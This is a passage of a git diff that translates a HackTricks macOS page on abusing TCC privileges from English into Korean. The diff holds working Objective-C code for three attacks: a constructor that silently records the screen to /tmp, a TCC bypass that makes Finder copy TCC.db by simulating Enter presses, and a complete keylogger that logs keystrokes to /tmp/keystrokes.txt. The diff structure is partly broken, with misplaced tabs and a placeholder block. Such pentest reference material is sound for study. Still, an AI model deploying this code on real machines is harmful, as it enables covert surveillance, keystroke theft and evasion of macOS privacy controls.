+[locationManager startUpdatingLocation];
 
-    NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
-    while (true) {
-        [runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
-    }
+NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
+while (true) {
+[runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
+}
 
-    NSLog(@"Location completed successfully.");
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+NSLog(@"Location completed successfully.");
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 }
 ```
 {% endtab %}
 
-{% tab title="Shell" %}
-Get access to the location
-
+{% tab title="쉘" %}
+위치에 액세스하기
+{% endtab %}
 ```
 ???
 ```
-{% endtab %}
-{% endtabs %}
-
-### Screen Recording
-
-* **Entitlement**: None
-* **TCC**: `kTCCServiceScreenCapture`
-
 {% tabs %}
 {% tab title="ObjectiveC" %}
-Record the main screen for 5s in `/tmp/screen.mov`
-
+주요 화면을 5초 동안 `/tmp/screen.mov`에 녹화합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -690,68 +652,62 @@ Record the main screen for 5s in `/tmp/screen.mov`
 
 @implementation MyRecordingDelegate
 
-- (void)captureOutput:(AVCaptureFileOutput *)output 
-    didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL 
-    fromConnections:(NSArray *)connections 
-    error:(NSError *)error {
-    if (error) {
-        NSLog(@"Recording error: %@", error);
-    } else {
-        NSLog(@"Recording finished successfully.");
-    }
-    exit(0);
+- (void)captureOutput:(AVCaptureFileOutput *)output
+didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
+fromConnections:(NSArray *)connections
+error:(NSError *)error {
+if (error) {
+NSLog(@"Recording error: %@", error);
+} else {
+NSLog(@"Recording finished successfully.");
+}
+exit(0);
 }
 
 @end
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
-    AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
-    AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
-    if ([captureSession canAddInput:screenInput]) {
-        [captureSession addInput:screenInput];
-    }
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
+AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
+if ([captureSession canAddInput:screenInput]) {
+[captureSession addInput:screenInput];
+}
 
-    AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
-    if ([captureSession canAddOutput:fileOutput]) {
-        [captureSession addOutput:fileOutput];
-    }
+AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
+if ([captureSession canAddOutput:fileOutput]) {
+[captureSession addOutput:fileOutput];
+}
 
-    [captureSession startRunning];
+[captureSession startRunning];
 
-    MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
-    [fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];
+MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
+[fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];
 
-    // Run the loop for 5 seconds to capture
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        [fileOutput stopRecording];
-    });
+// Run the loop for 5 seconds to capture
+dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+[fileOutput stopRecording];
+});
 
-    CFRunLoopRun();
-    freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
+CFRunLoopRun();
+freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 }
 ```
-{% endtab %}
-
 {% tab title="Shell" %}
-Record the main screen for 5s
-
+주요 화면을 5초 동안 녹화합니다.
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {% endtab %}
 {% endtabs %}
 
-### Accessibility
+### 접근성
 
-* **Entitlement**: None
+* **권한**: 없음
 * **TCC**: `kTCCServiceAccessibility`
 
-Use the TCC privilege to accept the control of Finder pressing enter and bypass TCC that way
-
-{% tabs %}
-{% tab title="Accept TCC" %}
+TCC 권한을 사용하여 Finder의 엔터 키를 눌러 제어를 받고, 이를 통해 TCC를 우회합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -761,52 +717,49 @@ Use the TCC privilege to accept the control of Finder pressing enter and bypass 
 // TODO: Improve to monitor the foreground app and press enter when TCC appears
 
 void SimulateKeyPress(CGKeyCode keyCode) {
-    CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
-    CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
-    CGEventPost(kCGHIDEventTap, keyDownEvent);
-    CGEventPost(kCGHIDEventTap, keyUpEvent);
-    if (keyDownEvent) CFRelease(keyDownEvent);
-    if (keyUpEvent) CFRelease(keyUpEvent);
+CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
+CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
+CGEventPost(kCGHIDEventTap, keyDownEvent);
+CGEventPost(kCGHIDEventTap, keyUpEvent);
+if (keyDownEvent) CFRelease(keyDownEvent);
+if (keyUpEvent) CFRelease(keyUpEvent);
 }
 
 void RunAppleScript() {
-    NSLog(@"Starting AppleScript");
-    NSString *scriptSource = @"tell application \"Finder\"\n"
-                             "set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
-                             "set targetFolder to POSIX file \"/tmp\" as alias\n"
-                             "duplicate file sourceFile to targetFolder with replacing\n"
-                             "end tell\n";
+NSLog(@"Starting AppleScript");
+NSString *scriptSource = @"tell application \"Finder\"\n"
+"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
+"set targetFolder to POSIX file \"/tmp\" as alias\n"
+"duplicate file sourceFile to targetFolder with replacing\n"
+"end tell\n";
 
-    NSDictionary *errorDict = nil;
-    NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
-    [appleScript executeAndReturnError:&errorDict];
+NSDictionary *errorDict = nil;
+NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
+[appleScript executeAndReturnError:&errorDict];
 
-    if (errorDict) {
-        NSLog(@"AppleScript Error: %@", errorDict);
-    }
+if (errorDict) {
+NSLog(@"AppleScript Error: %@", errorDict);
+}
 }
 
 int main() {
-    @autoreleasepool {
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-            RunAppleScript();
-        });
+@autoreleasepool {
+dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+RunAppleScript();
+});
 
-        // Simulate pressing the Enter key every 0.1 seconds
-        NSLog(@"Starting key presses");
-        for (int i = 0; i < 10; ++i) {
-            SimulateKeyPress((CGKeyCode)36); // Key code for Enter
-            usleep(100000); // 0.1 seconds
-        }
-    }
-    return 0;
+// Simulate pressing the Enter key every 0.1 seconds
+NSLog(@"Starting key presses");
+for (int i = 0; i < 10; ++i) {
+SimulateKeyPress((CGKeyCode)36); // Key code for Enter
+usleep(100000); // 0.1 seconds
+}
+}
+return 0;
 }
 ```
-{% endtab %}
-
 {% tab title="Keylogger" %}
-Store the pressed keys in **`/tmp/keystrokes.txt`**
-
+눌린 키를 **`/tmp/keystrokes.txt`**에 저장합니다.
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -817,116 +770,116 @@ Store the pressed keys in **`/tmp/keystrokes.txt`**
 NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";
 
 void AppendStringToFile(NSString *str, NSString *filePath) {
-    NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
-    if (fileHandle) {
-        [fileHandle seekToEndOfFile];
-        [fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
-        [fileHandle closeFile];
-    } else {
-        // If the file does not exist, create it
-        [str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    }
+NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
+if (fileHandle) {
+[fileHandle seekToEndOfFile];
+[fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
+[fileHandle closeFile];
+} else {
+// If the file does not exist, create it
+[str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
+}
 }
 
 CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    if (type == kCGEventKeyDown) {
-        CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+if (type == kCGEventKeyDown) {
+CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-        NSString *keyString = nil;
-        // First, handle special non-printable keys
-        switch (keyCode) {
-            case kVK_Return: keyString = @"<Return>"; break;
-            case kVK_Tab: keyString = @"<Tab>"; break;
-            case kVK_Space: keyString = @"<Space>"; break;
-            case kVK_Delete: keyString = @"<Delete>"; break;
-            case kVK_Escape: keyString = @"<Escape>"; break;
-            case kVK_Command: keyString = @"<Command>"; break;
-            case kVK_Shift: keyString = @"<Shift>"; break;
-            case kVK_CapsLock: keyString = @"<CapsLock>"; break;
-            case kVK_Option: keyString = @"<Option>"; break;
-            case kVK_Control: keyString = @"<Control>"; break;
-            case kVK_RightControl: keyString = @"<Control>"; break;
-            case kVK_RightShift: keyString = @"<Shift>"; break;
-            case kVK_RightOption: keyString = @"<Option>"; break;
-            case kVK_Function: keyString = @"<Function>"; break;
-            case kVK_F1: keyString = @"<F1>"; break;
-            case kVK_F2: keyString = @"<F2>"; break;
-            case kVK_F3: keyString = @"<F3>"; break;
-            // Add more cases here for other non-printable keys...
-            default: break; // Not a special non-printable key
-        }
+NSString *keyString = nil;
+// First, handle special non-printable keys
+switch (keyCode) {
+case kVK_Return: keyString = @"<Return>"; break;
+case kVK_Tab: keyString = @"<Tab>"; break;
+case kVK_Space: keyString = @"<Space>"; break;
+case kVK_Delete: keyString = @"<Delete>"; break;
+case kVK_Escape: keyString = @"<Escape>"; break;
+case kVK_Command: keyString = @"<Command>"; break;
+case kVK_Shift: keyString = @"<Shift>"; break;
+case kVK_CapsLock: keyString = @"<CapsLock>"; break;
+case kVK_Option: keyString = @"<Option>"; break;
+case kVK_Control: keyString = @"<Control>"; break;
+case kVK_RightControl: keyString = @"<Control>"; break;
+case kVK_RightShift: keyString = @"<Shift>"; break;
+case kVK_RightOption: keyString = @"<Option>"; break;
+case kVK_Function: keyString = @"<Function>"; break;
+case kVK_F1: keyString = @"<F1>"; break;
+case kVK_F2: keyString = @"<F2>"; break;
+case kVK_F3: keyString = @"<F3>"; break;
+// Add more cases here for other non-printable keys...
+default: break; // Not a special non-printable key
+}
 
-        // If it's not a special key, try to translate it
-        if (!keyString) {
-            UniCharCount maxStringLength = 4;
-            UniCharCount actualStringLength = 0;
-            UniChar unicodeString[maxStringLength];
-            
-            TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
-            CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
-            const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
-            
-            UInt32 deadKeyState = 0;
-            OSStatus status = UCKeyTranslate(keyboardLayout,
-                                             keyCode,
-                                             kUCKeyActionDown,
-                                             0,
-                                             LMGetKbdType(),
-                                             kUCKeyTranslateNoDeadKeysBit,
-                                             &deadKeyState,
-                                             maxStringLength,
-                                             &actualStringLength,
-                                             unicodeString);
-            CFRelease(currentKeyboard);
+// If it's not a special key, try to translate it
+if (!keyString) {
+UniCharCount maxStringLength = 4;
+UniCharCount actualStringLength = 0;
+UniChar unicodeString[maxStringLength];
 
-            if (status == noErr && actualStringLength > 0) {
-                keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
-            } else {
-                keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
-            }
-        }
+TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
+CFDataRef layoutData = TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
+const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
 
-        NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
-        AppendStringToFile(logString, kKeystrokesLogPath);
-    }
-    return event;
+UInt32 deadKeyState = 0;
+OSStatus status = UCKeyTranslate(keyboardLayout,
+keyCode,
+kUCKeyActionDown,
+0,
+LMGetKbdType(),
+kUCKeyTranslateNoDeadKeysBit,
+&deadKeyState,
+maxStringLength,
+&actualStringLength,
+unicodeString);
+CFRelease(currentKeyboard);
+
+if (status == noErr && actualStringLength > 0) {
+keyString = [NSString stringWithCharacters:unicodeString length:actualStringLength];
+} else {
+keyString = [NSString stringWithFormat:@"<KeyCode: %d>", keyCode];
+}
+}
+
+NSString *logString = [NSString stringWithFormat:@"%@\n", keyString];
+AppendStringToFile(logString, kKeystrokesLogPath);
+}
+return event;
 }
 
 int main() {
-    @autoreleasepool {
-        CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
-        CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);
+@autoreleasepool {
+CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);
+CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, KeyboardEventCallback, NULL);
 
-        if (!eventTap) {
-            NSLog(@"Failed to create event tap");
-            exit(1);
-        }
+if (!eventTap) {
+NSLog(@"Failed to create event tap");
+exit(1);
+}
 
-        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
-        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
-        CGEventTapEnable(eventTap, true);
-        CFRunLoopRun();
-    }
-    return 0;
+CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
+CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
+CGEventTapEnable(eventTap, true);
+CFRunLoopRun();
+}
+return 0;
 }
 ```
 {% endtab %}
 {% endtabs %}
 
 {% hint style="danger" %}
-**Accessibility is a very powerful permission**, you could abuse it in other ways, for example you could perform the **keystrokes attack** just from it without needed to call System Events.
+**접근성은 매우 강력한 권한**입니다. 예를 들어, 시스템 이벤트를 호출할 필요 없이 접근성을 통해 **키스트로크 공격**을 수행할 수도 있습니다.
 {% endhint %}
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks를 지원하는 다른 방법:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
+* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
 
 </details>
